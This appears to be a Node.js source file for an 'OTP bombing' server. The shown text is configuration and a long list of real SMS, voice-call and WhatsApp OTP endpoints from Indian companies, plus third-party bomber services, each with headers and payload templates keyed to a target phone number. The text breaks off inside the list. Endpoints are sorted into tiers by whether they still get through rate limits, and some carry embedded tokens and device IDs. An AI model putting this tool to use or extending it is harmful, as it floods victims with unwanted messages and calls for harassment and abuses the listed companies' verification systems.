// ============================================================
// api_server.js - OTP Bombing API Server (FINAL MERGED)
// ALL APIs from all sources, duplicates removed
// /stats endpoint shows working/rate-limited status for all APIs
// ============================================================

const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// 🔥 CONFIGURATION
const MAX_DURATION_MIN = 10;
const BATCH_DELAY_MS = 100;
const API_DELAY_MS = 50;

// ============================================================
// ===== ALL APIS (MERGED & DEDUPLICATED) =====
// ============================================================

const APIS = [

    // ============================================================
    // ✅ TIER 0 — VERIFIED WORKING APIs (200/201/202)
    // ============================================================

    // ===== SMS APIs =====
    {
        name: "Astroyogi_V3_SMS",
        method: "POST",
        url: "https://chang.astroyogi.com/api/UserAccountV2/WebGenerateOtpV3",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 15; RMX3782) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "sec-ch-ua-platform": "Android",
            "authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzg0NDE0ODc0LCJleHAiOjE3OTIxOTA4NzR9.",
            "origin": "https://www.astroyogi.com",
            "referer": "https://www.astroyogi.com/registration/login.aspx"
        },
        data: (phone) => JSON.stringify({ PhoneNumber: phone, PhoneCode: "91", Domain: "Web", CountryId: "IN", IpAddress: "2409:40e4:1143:e495:8000::", CountryCodeByHeader: "IN" })
    },
    {
        name: "SmartCoin_SMS",
        method: "POST",
        url: "https://webapp.smartcoin.co.in/webflow/pre_auth/otp/request",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "user_platform": "WEBFLOW",
            "platform_code": "olyv",
            "origin": "https://app.olyv.co.in",
            "referer": "https://app.olyv.co.in/"
        },
        data: (phone) => JSON.stringify({ phone_number: phone, app_version: "100101", channel: "SMS", request_type: "REGISTRATION", onboarding_consent: true })
    },
    {
        name: "DamieCloud_SMS",
        method: "GET",
        url: "https://damiecloud.online/send/{phone}",
        headers: { "User-Agent": "Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36", "Accept": "*/*" }
    },

    // ===== MAIN BOMBER APIS (WORKING) =====
    { name: "SMS Bomber", url: "http://sms-bomber.subhxcosmo.workers.dev/api?num={phone}", method: "GET" },
    { name: "Bomberrr Vercel", url: "https://bomberrr.vercel.app/?key=roots&number={phone}", method: "GET" },
    { name: "Bolbet", url: "https://bolbet-liart.vercel.app/?key=roots&number={phone}", method: "GET" },
    { name: "FreeFire Bomber", url: "https://freefire-api.ct.ws/bomber4.php?phone={phone}&duration=10", method: "GET" },
    { name: "Call Bomber PRO", url: "https://call-bomber-50k3t8a6r-rohit-harshes-projects.vercel.app/bomb?number={phone}", method: "GET" },
    { name: "Bomberr Xtreme", url: "https://bomberr.onrender.com/num={phone}", method: "GET" },
    { name: "Bombar API 1", url: "https://bombar-1.vercel.app/api/bom?number={phone}", method: "GET" },
    { name: "Bombar API 2", url: "https://bombar-api-2.vercel.app/all?number={phone}", method: "GET" },
    { name: "Mahadev Bomber", url: "https://bomber-by-mahadev.paskhinpf9.workers.dev/?phone={phone}", method: "GET" },
    { name: "Splexxo1", url: "https://splexxo1-2api.vercel.app/bomb?phone={phone}&key=SPLEXXO", method: "GET" },
    { name: "Ultimate Bomber", url: "https://ultimate-bomber.vercel.app/api/bomb?number={phone}", method: "GET" },
    { name: "Mega Bomber", url: "https://mega-bomber.onrender.com/api?phone={phone}", method: "GET" },
    { name: "Atomic Bomber", url: "https://atomic-bomber.cyclic.app/bomb?num={phone}", method: "GET" },
    { name: "Nuclear Bomber", url: "https://nuclear-bomber.herokuapp.com/api?phone={phone}", method: "GET" },
    { name: "Fury Bomber", url: "https://fury-bomber.vercel.app/api/bomb?number={phone}", method: "GET" },

    // ===== VOICE/CALL APIs =====
    { name: "Tata Capital Voice", url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p, isOtpViaCallAtLogin: "true" }) },
    { name: "1MG Voice", url: "https://www.1mg.com/auth_api/v6/create_token", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ number: p, otp_on_call: true }) },
    { name: "Swiggy Call", url: "https://profile.swiggy.com/api/v3/app/request_call_verification", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "Myntra Voice", url: "https://www.myntra.com/gw/mobile-auth/voice-otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "Flipkart Voice", url: "https://www.flipkart.com/api/6/user/voice-otp/generate", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "Paytm Voice", url: "https://accounts.paytm.com/signin/voice-otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }) },
    { name: "Zomato Voice", url: "https://www.zomato.com/php/o2_api_handler.php", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: (p) => `phone=${p}&type=voice` },
    { name: "MakeMyTrip Voice", url: "https://www.makemytrip.com/api/4/voice-otp/generate", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }) },
    { name: "Goibibo Voice", url: "https://www.goibibo.com/user/voice-otp/generate/", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }) },
    { name: "Ola Voice", url: "https://api.olacabs.com/v1/voice-otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }) },
    { name: "Uber Voice", url: "https://auth.uber.com/v2/voice-otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: `+91${p}` }) },
    { name: "IRCTC Call", url: "https://www.irctc.co.in/api/v1/voice-otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "PhonePe Call", url: "https://www.phonepe.com/api/v1/voice-otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "Google Voice", url: "https://accounts.google.com/v1/voice-otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }) },
    { name: "Refyne_Call", method: "POST", url: "https://prod-api.refyne.co.in/auth/v2/send-otp", headers: { "Content-Type": "application/json", "Authorization": "Bearer", "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4)" }, data: (phone) => JSON.stringify({ channel: "IVR", recipient: phone }) },
    { name: "SmartCoin_Call", method: "POST", url: "https://webapp.smartcoin.co.in/webflow/pre_auth/otp/request", headers: { "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36", "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "user_platform": "WEBFLOW", "platform_code": "olyv", "origin": "https://app.olyv.co.in", "referer": "https://app.olyv.co.in/" }, data: (phone) => JSON.stringify({ phone_number: phone, app_version: "100101", channel: "IVR", request_type: "REGISTRATION", onboarding_consent: true }) },
    { name: "Astrosage_Call", method: "GET", url: "https://varta.astrosage.com/sdk/send-otp-via-call?callback=myCallback&countrycode=91&phoneno={phone}&deviceid=&operation_name=blank&jsonpcall=1&fromresend=0&_=0", headers: { "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36", "Accept": "*/*", "X-Requested-With": "pure.lite.browser", "Referer": "http://www.astrosage.com/" } },

    // ===== WHATSAPP APIs =====
    { name: "KPN WhatsApp", url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", method: "POST", headers: { "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "Content-Type": "application/json" }, data: (p) => JSON.stringify({ notification_channel: "WHATSAPP", phone_number: { country_code: "+91", number: p } }) },
    { name: "Foxy WhatsApp", url: "https://www.foxy.in/api/v2/users/send_otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ user: { phone_number: `+91${p}` }, via: "whatsapp" }) },
    { name: "Stratzy WhatsApp", url: "https://stratzy.in/api/web/whatsapp/sendOTP", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phoneNo: p }) },
    { name: "Jockey WhatsApp", url: (p) => `https://www.jockey.in/apps/jotp/api/login/resend-otp/+91${p}?whatsapp=true`, method: "GET" },
    { name: "Rappi WhatsApp", url: "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ country_code: "+91", phone: p }) },
    { name: "Eka Care WhatsApp", url: "https://auth.eka.care/auth/init", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ payload: { allowWhatsapp: true, mobile: `+91${p}` }, type: "mobile" }) },
    { name: "Rapido WhatsApp", url: "https://app.rapido.bike/api/v3/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: `+91${p}`, channel: "whatsapp" }) },
    { name: "Country Delight WhatsApp", url: "https://api.countrydelight.in/api/v1/customer/requestOtp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p, platform: "Android", mode: "new_user", channel: "whatsapp" }) },
    { name: "Breeze_WA", method: "POST", url: "https://api.breeze.in/session/start", headers: { "Content-Type": "application/json", "x-device-id": "A1pKVEDhlv66KLtoYsml3", "x-session-id": "MUUdODRfiL8xmwzhEpjN8" }, data: (phone) => JSON.stringify({ phoneNumber: phone, authVerificationType: "otp", device: { id: "A1pKVEDhlv66KLtoYsml3", platform: "Chrome", type: "Desktop" }, countryCode: "+91" }) },
    { name: "GoKwik_WA", method: "POST", url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers: { "accept": "application/json", "content-type": "application/json", "gk-merchant-id": "19g6im8srkz9y" }, data: (phone) => JSON.stringify({ phone: phone, country: "IN" }) },
    { name: "Redcliffe_WA", method: "POST", url: "https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false", headers: { "accept": "application/json", "content-type": "application/json" }, data: (phone) => JSON.stringify({ phone_number: phone, short: true, country_code: "+91" }) },
    { name: "Licious_WA", method: "POST", url: "https://www.licious.in/api/login/signup", headers: { "Accept": "application/json", "Content-Type": "application/json" }, data: (phone) => JSON.stringify({ phone: phone, captcha_token: null }) },
    { name: "OYO_WA", method: "POST", url: "https://www.oyorooms.com/api/pwa/generateotp?locale=en", headers: { "Accept": "application/json", "Content-Type": "text/plain;charset=UTF-8", "Cookie": "user_id=none; country_code=IN;" }, data: (phone) => JSON.stringify({ phone: phone, country_code: "+91", nod: 4 }) },
    { name: "KPNFresh_WA", method: "POST", url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0", headers: { "x-app-id": "32178bdd-a25d-477e-b8d5-60df92bc2587", "Content-Type": "application/json" }, data: (phone) => JSON.stringify({ phone_number: { country_code: "+91", number: phone } }) },
    { name: "AdityaBirla_WA", method: "POST", url: "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP", headers: { "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest" }, data: { "_raw": "MobileNumber={phone}&functionality=signup" } },
    { name: "IIFL_WA", method: "POST", url: "https://www.iifl.com/personal-loans?_wrapper_format=html&ajax_form=1", headers: { "content-type": "application/x-www-form-urlencoded", "x-requested-with": "XMLHttpRequest" }, data: { "_raw": "apply_for=18&full_name=Adnvs+Signh&mobile_number={phone}&terms_and_condition=1" } },
    { name: "TradeIndia_WA", method: "POST", url: "https://apis.tradeindia.com/app_login_api/login_app", headers: { "accept": "application/json", "content-type": "application/json" }, data: (phone) => JSON.stringify({ mobile: "+91" + phone }) },
    { name: "AstroSage_WA", method: "GET", url: "https://varta.astrosage.com/sdk/registerAS?callback=myCallback&countrycode=91&phoneno={phone}&deviceid=&jsonpcall=1&fromresend=0&operation_name=blank", headers: { "accept": "*/*", "referer": "https://www.astrosage.com/" } },
    { name: "BharatLoan_WA", method: "POST", url: "https://www.bharatloan.com/login-sbm", headers: { "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://www.bharatloan.com", "Referer": "https://www.bharatloan.com/apply-now", "X-Requested-With": "XMLHttpRequest" }, data: { "_raw": "mobile={phone}&current_page=login&is_existing_customer=2" } },
    { name: "Pagarbook_WA", method: "POST", url: "https://api.pagarbook.com/api/v5/auth/otp/request", headers: { "accept": "application/json", "appversioncode": "5268", "clientplatform": "WEB", "content-type": "application/json", "userrole": "EMPLOYER" }, data: (phone) => JSON.stringify({ phone: phone, language: 1 }) },
    { name: "55Club_WA", method: "POST", url: "https://api.55clubapi.com/api/webapi/SmsVerifyCode", headers: { "accept": "application/json", "content-type": "application/json;charset=UTF-8", "origin": "https://55club08.in", "referer": "https://55club08.in/" }, data: (phone) => JSON.stringify({ phone: "91" + phone, codeType: 1, language: 0, random: "35ae48f136d74b279dbd0eeb2504e7f8", signature: "78A2879A0D46B65D257F9B29354B5DBA", timestamp: 1715445820 }) },
    { name: "Zerodha_WA", method: "POST", url: "https://zerodha.com/account/registration.php", headers: { "accept": "*/*", "content-type": "application/json" }, data: (phone) => JSON.stringify({ mobile: phone, source: "zerodha", partner_id: "" }) },
    { name: "Testbook_WA", method: "POST", url: "https://api.testbook.com/api/v2/mobile/signup?mobile={phone}&clientId=1117490662.1715447223", headers: { "accept": "application/json", "content-type": "application/json", "x-tb-client": "web,1.2" }, data: (phone) => JSON.stringify({ firstVisitSource: { type: "organic", utm_source: "google", utm_medium: "organic" }, mobile: phone, signupDetails: { page: "HomePage" } }) },
    { name: "MediBuddy_WA", method: "POST", url: "https://loginprod.medibuddy.in/unified-login/user/register", headers: { "accept": "application/json", "content-type": "application/json" }, data: (phone) => JSON.stringify({ source: "medibuddyInWeb", platform: "medibuddy", phonenumber: phone, flow: "Retail-Login-Home-Flow" }) },
    { name: "Tyreplex_WA", method: "POST", url: "https://www.tyreplex.com/includes/ajax/gfend.php", headers: { "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://www.tyreplex.com", "Referer": "https://www.tyreplex.com/login", "X-Requested-With": "XMLHttpRequest" }, data: { "_raw": "perform_action=sendOTP&mobile_no={phone}&action_type=order_login" } },
    { name: "Moglix_WA", method: "POST", url: "https://apinew.moglix.com/nodeApi/v1/login/sendOTP", headers: { "accept": "application/json", "content-type": "application/json", "origin": "https://www.moglix.com", "referer": "https://www.moglix.com/" }, data: (phone) => JSON.stringify({ email: "", phone: phone, type: "p", source: "signup", buildVersion: "DESKTOP-7.3", device: "desktop" }) },
    { name: "Xylem_WA", method: "POST", url: "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348", headers: { "client-version": "300", "Authorization": "Bearer", "Content-Type": "application/json", "Accept": "application/json, text/plain, */*", "Referer": "https://www.xylem.live/", "randomId": "bfc4e54e-1873-48cc-823e-40d401d9dbb4", "client-id": "64254d66be2a390018e6d348", "client-type": "WEB" }, data: (phone) => JSON.stringify({ mobile: phone, countryCode: "+91", firstName: "Anant Ambani" }) },
    { name: "Vidyakul_WA", method: "POST", url: "https://vidyakul.com/signup-otp/send", headers: { "accept": "application/json, text/javascript, */*; q=0.01", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://vidyakul.com", "referer": "https://vidyakul.com/class-12th/test-series", "x-csrf-token": "el0GIsHQSO3Y4upLoQOm3coVWNEiNtiKJONg2LJx", "x-requested-with": "XMLHttpRequest" }, data: { "_raw": "phone={phone}" } },
    { name: "Vedantu_WA", method: "POST", url: "https://user.vedantu.com/user/preLoginVerification", headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://www.vedantu.com", "referer": "https://www.vedantu.com/register" }, data: (phone) => JSON.stringify({ email: null, phoneCode: "+91", phoneNumber: phone, sType: "VEDANTU_F_7_N", sValue: "FC34EE3ED23399CD7622BA1851D3E", token: "5nXaR2BzqApBb3Wf", ver: "1772629389", version: 2, whatsappCommunicationEnabled: false }) },
    { name: "Unacademy_WA", method: "POST", url: "https://unacademy.com/api/v3/user/user_check/?enable-email=true", headers: { "accept": "*/*", "content-type": "application/json", "x-platform": "0" }, data: (phone) => JSON.stringify({ country_code: "IN", phone: phone, is_un_teach_user: false, otp_type: 2.0, send_otp: true, email: "" }) },
    { name: "Myntra_WA", method: "POST", url: "https://www.myntra.com/gateway/v1/auth/getotp", headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://www.myntra.com", "referer": "https://www.myntra.com/login", "deviceid": "8b9a6835-e2e0-42ec-9e0f-290e5e7e5a6f", "x-myntraweb": "Yes", "x-requested-with": "browser", "x-location-context": "pincode=276304;source=IP", "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36" }, data: (phone) => JSON.stringify({ phoneNumber: phone, signup: "ONECLICK" }) },
    { name: "IndiaMart_WA", method: "POST", url: "https://m.indiamart.com/ajaxrequest/identified/common/login", headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://m.indiamart.com", "referer": "https://m.indiamart.com/login/" }, data: (phone) => JSON.stringify({ GEOIP_COUNTRY_ISO: "IN", IP: "47.9.35.50", IPADDRESS: "47.9.35.50", IP_COUNTRY: "India", ciso: "IN", duplicateEmailCheck: "", glid: "", glusr_usr_ip: "47.9.35.50", originalreferer: "https://m.indiamart.com/login/", pass: "", ph_code: "91", use: phone }) },
    { name: "CityMallWeb_WA", method: "POST", url: "https://citymall.live/web-api/auth/send-otp", headers: { "accept": "application/json, text/plain, */*", "content-type": "application/json", "host": "citymall.live", "origin": "https://citymall.live", "referer": "https://citymall.live/", "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36" }, data: (phone) => JSON.stringify({ phone_number: phone }) },
    { name: "Zepto_WA", method: "POST", url: "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/", headers: { "Content-Type": "application/json", "Accept": "application/json", "Origin": "https://www.zepto.com", "Referer": "https://www.zepto.com/" }, data: (phone) => JSON.stringify({ mobileNumber: phone, countryCode: "+91" }) },
    { name: "Tyreplex2_WA", method: "POST", url: "https://www.tyreplex.com/includes/ajax/gfend.php", headers: { "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://www.tyreplex.com", "Referer": "https://www.tyreplex.com/login", "X-Requested-With": "XMLHttpRequest" }, data: { "_raw": "perform_action=sendOTP&mobile_no={phone}&action_type=order_login" } },

    // ============================================================
    // 🚫 RATE LIMITED APIs
    // ============================================================
    { name: "RL_1mg_SMS", method: "POST", url: "https://www.1mg.com/auth_api/v6/create_token", headers: { "Accept": "application/vnd.healthkartplus.v11+json", "Content-Type": "application/json; charset=utf-8", "User-Agent": "okhttp/3.9.1" }, data: (phone) => JSON.stringify({ number: phone, is_corporate_user: false, otp_on_call: false }), rateLimit: true },
    { name: "RL_1mg_Call", method: "POST", url: "https://www.1mg.com/auth_api/v6/create_token", headers: { "Accept": "application/vnd.healthkartplus.v11+json", "Content-Type": "application/json; charset=utf-8", "User-Agent": "okhttp/3.9.1" }, data: (phone) => JSON.stringify({ number: phone, is_corporate_user: false, otp_on_call: true }), rateLimit: true },
    { name: "RL_AgriEvolution_WA", method: "POST", url: "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", headers: { "Content-Type": "application/json" }, data: (phone) => JSON.stringify({ mobile_number: phone, client_id: "kisan-app" }), rateLimit: true },
    { name: "RL_Freedo_WA", method: "POST", url: "https://api.freedo.rentals/customer/sendOtpForSignUp", headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://freedo.rentals", "platform": "web", "referer": "https://freedo.rentals/", "requestfrom": "customer", "x-bn": "2.0.16", "x-channel": "WEB", "x-client-id": "FREEDO", "x-platform": "CUSTOMER" }, data: (phone) => JSON.stringify({ email_id: "cokiwav528@avastu.com", first_name: "Haiii", mobile_number: phone }), rateLimit: true },
    { name: "RL_Ixigo_WA", method: "POST", url: "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp", headers: { "accept": "*/*", "apikey": "ixiweb!2$", "clientid": "ixiweb", "content-type": "application/x-www-form-urlencoded" }, data: { "_raw": "sixDigitOTP=true&prefix=%2B91&phone={phone}" }, rateLimit: true },
    { name: "RL_Udaan_WA", method: "POST", url: "https://auth.udaan.com/api/otp/send?client_id=udaan-v2&whatsappConsent=true", headers: { "accept": "*/*", "content-type": "application/x-www-form-urlencoded;charset=UTF-8", "origin": "https://auth.udaan.com", "x-app-id": "udaan-auth" }, data: { "_raw": "mobile={phone}" }, rateLimit: true },

    // ============================================================
    // 🟢 TIER 1 — OLD RELIABLE
    // ============================================================
    { name: "GetInstaCash", method: "POST", url: "https://getinstacash.in/sell/getData.php", headers: { "Accept": "*/*", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://getinstacash.in", "Referer": "https://getinstacash.in/sell/login" }, data: { "_raw": "type=sendOTP&mobile={phone}" } },
    { name: "Flipkart_2", method: "GET", url: "https://img1a.flixcart.com/batman-returns/batman-returns/p/images/logo_lite-cbb357.png", headers: { "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5", "Accept": "*/*", "Referer": "https://www.flipkart.com/login/verify?type=mobile&verificationType=otp&loginIdentifier={phone}&loginIdentifierPrefix=%2B91&sourceContext=default" } },
    { name: "AakashDigital_2", method: "POST", url: "https://digital.aakash.ac.in/signup-otp-verify", headers: { "accept": "*/*", "origin": "https://digital.aakash.ac.in", "x-requested-with": "XMLHttpRequest", "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "referer": "https://digital.aakash.ac.in/user/register" }, data: { "_raw": "&mobileval={phone}" } },
    { name: "RedBus_1", method: "GET", url: "https://m.redbus.in/api/getOtp?number={phone}&cc=91&whatsAppOpted=undefined", headers: { "accept": "application/json, text/plain, */*", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "referer": "https://m.redbus.in/preregister" } },
    { name: "Snapdeal", method: "POST", url: "https://m.snapdeal.com/signupCompleteAjax", headers: { "xc": "eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In19", "h2": "true", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "xg": "eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In0sInVpZCI6eyJndWlkIjoiMWMwNzhhMTMtZGU1My00ZDRkLTkwOTgtNzFmM2JlOTY5YjJiIn19fHwxNjAwODEzMDIyNTk1", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "u": "160081122259159083", "accept": "*/*", "origin": "https://m.snapdeal.com", "referer": "https://m.snapdeal.com/signin" }, data: { "_raw": "j_password=null&j_mobilenumber={phone}&agree=true&j_confpassword=null&journey=mobile&numberEdit=false&swp=true&j_fullname=uyuhyntuhy" } },
    { name: "Quikr", method: "POST", url: "https://www.quikr.com/core/sendOtp?_t=0e2ed2ef8cff0015a917b9cf98ccaea3", headers: { "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "content-type": "application/x-www-form-urlencoded;charset=UTF-8", "accept": "*/*", "origin": "https://www.quikr.com", "referer": "https://www.quikr.com/" }, data: { "_raw": "user={phone}&v3=true" } },

    // ============================================================
    // 🟡 TIER 2 — OLD PURANI WORKING
    // ============================================================
    { name: "Tata Capital Voice", url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => JSON.stringify({ phone, isOtpViaCallAtLogin: "true" }) },
    { name: "Ogonn", method: "POST", url: "https://ogonn.in/otp", headers: { "accept": "application/json, text/javascript, */*; q=0.01", "origin": "https://ogonn.in", "x-requested-with": "XMLHttpRequest", "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "referer": "https://ogonn.in/login" }, data: { "_raw": "_token=I10LMVWBAN1c30T8SbgVHHvlKFTgTU1iFTm7hlfl&mobile={phone}" } },
    { name: "AakashDigital_1", method: "POST", url: "https://digital.aakash.ac.in/mkt-signup-otp-verify", headers: { "accept": "*/*", "origin": "https://digital.aakash.ac.in", "x-requested-with": "XMLHttpRequest", "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "referer": "https://digital.aakash.ac.in/" }, data: { "_raw": "&mobileval={phone}&otp=6230" } },
    { name: "Flipkart_1", method: "POST", url: "https://1.rome.api.flipkart.com/1/action/view", headers: { "x-user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5FKUA/msite/0.0.3/msite/Mobile", "Origin": "https://www.flipkart.com", "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5", "content-type": "application/json", "Accept": "*/*", "Referer": "https://www.flipkart.com/login" }, data: { "actionRequestContext": { "type": "LOGIN_IDENTITY_VERIFY", "loginIdPrefix": "+91", "loginId": "{phone}", "clientQueryParamMap": { "ret": "/?affid=siteplug&affExtParam1=e2f29ff2e3dd9e65eb9e419d30dc8135", "entryPage": "HOMEPAGE_HEADER_ACCOUNT" }, "loginType": "MOBILE", "verificationType": "OTP", "screenName": "LOGIN_V4_MOBILE", "sourceContext": "DEFAULT" } } },
    { name: "Netmeds", method: "GET", url: "https://m.netmeds.com/mst/rest/v1/id/details/{phone}", headers: { "accept": "application/json, text/plain, */*", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "referer": "https://m.netmeds.com/customer/account/login" } },

    // ============================================================
    // 🟢 TIER 3 — OLD NAYI WORKING
    // ============================================================
    { name: "Vedantu", method: "POST", url: "https://user.vedantu.com/user/preLoginVerification", headers: { "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "content-type": "application/json", "accept": "*/*", "origin": "https://www.vedantu.com", "referer": "https://www.vedantu.com/" }, data: { "email": null, "phoneCode": "+91", "phoneNumber": "{phone}", "ver": "11.345" } },
